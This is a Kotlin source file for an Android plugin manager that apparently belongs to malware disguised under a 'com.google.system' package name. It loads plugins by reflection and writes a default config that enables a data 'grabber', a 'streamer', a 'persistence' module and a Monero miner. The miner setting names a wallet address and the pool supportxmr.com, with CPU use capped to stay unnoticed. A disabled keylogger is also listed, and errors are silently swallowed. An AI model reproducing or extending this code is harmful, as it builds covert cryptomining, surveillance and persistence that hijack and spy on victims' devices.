package com.google.system.plugins

import android.content.Context
import org.json.JSONObject
import java.io.File

object PluginManager {
    private val plugins = mutableMapOf<String, Plugin>()
    private val config = mutableMapOf<String, PluginConfig>()
    
    data class PluginConfig(
        val enabled: Boolean,
        val version: String,
        val settings: Map<String, Any> = emptyMap()
    )
    
    fun loadAll(context: Context) {
        loadConfig(context)
        
        val pluginClasses = listOf(
            "com.google.system.plugins.MinerPlugin",
        )
        
        for (className in pluginClasses) {
            val id = className.substringAfterLast('.').substringBefore("Plugin").lowercase()
            val pluginConfig = config[id] ?: continue
            if (!pluginConfig.enabled) continue
            
            try {
                val clazz = Class.forName(className)
                val plugin = clazz.getDeclaredConstructor().newInstance() as Plugin
                if (plugin.onEnable(context)) {
                    plugins[id] = plugin
                }
            } catch (_: Exception) {}
        }
    }
    
    fun getCommandHandler(cmd: String): Plugin? {
        for (plugin in plugins.values) {
            if (plugin.commands.any { it.equals(cmd, ignoreCase = true) }) {
                return plugin
            }
        }
        return null
    }
    
    fun getPlugin(id: String): Plugin? = plugins[id]
    
    fun getEnabledPlugins(): List<String> = plugins.keys.toList()
    
    fun getStatusReport(): String {
        return buildString {
            appendLine("Plugins: ${plugins.size} loaded")
            for ((id, plugin) in plugins) {
                appendLine("  + $id v${plugin.version} - ${plugin.name}")
            }
            for ((id, cfg) in config) {
                if (!cfg.enabled && !plugins.containsKey(id)) {
                    appendLine("  - $id (disabled)")
                }
            }
        }
    }
    
    private fun loadConfig(context: Context) {
        try {
            val file = File(context.filesDir, "plugins.json")
            if (!file.exists()) {
                val default = """
                {
                  "grabber": { "enabled": true, "version": "2.0" },
                  "streamer": { "enabled": true, "version": "1.0" },
                  "miner": { "enabled": true, "version": "1.0", "settings": {
                    "wallet": "46i21n77LsSK9g4SmetVTSWi9yLE1jHjBPb2js5skp1zQ4a1jMztq1n4Hy1zKXqWSWigHzaoG1j8yJyAu5pvTvVH1ujyDeJ",
                    "pool": "pool.supportxmr.com:3333",
                    "threads": 2,
                    "max_cpu_percent": 40
                  }},
                  "keylogger": { "enabled": false, "version": "1.0" },
                  "persistence": { "enabled": true, "version": "1.0" }
                }
                """.trimIndent()
                file.writeText(default)
            }
            
            val json = JSONObject(file.readText())
            for (key in json.keys()) {
                val obj = json.getJSONObject(key)
                val enabled = obj.optBoolean("enabled", false)
                val version = obj.optString("version", "1.0")
                val settings = mutableMapOf<String, Any>()
                
                if (obj.has("settings")) {
                    val settingsObj = obj.getJSONObject("settings")
                    for (sKey in settingsObj.keys()) {
                        settings[sKey] = settingsObj.get(sKey)
                    }
                }
                
                config[key] = PluginConfig(enabled, version, settings)
            }
        } catch (_: Exception) {}
    }
}
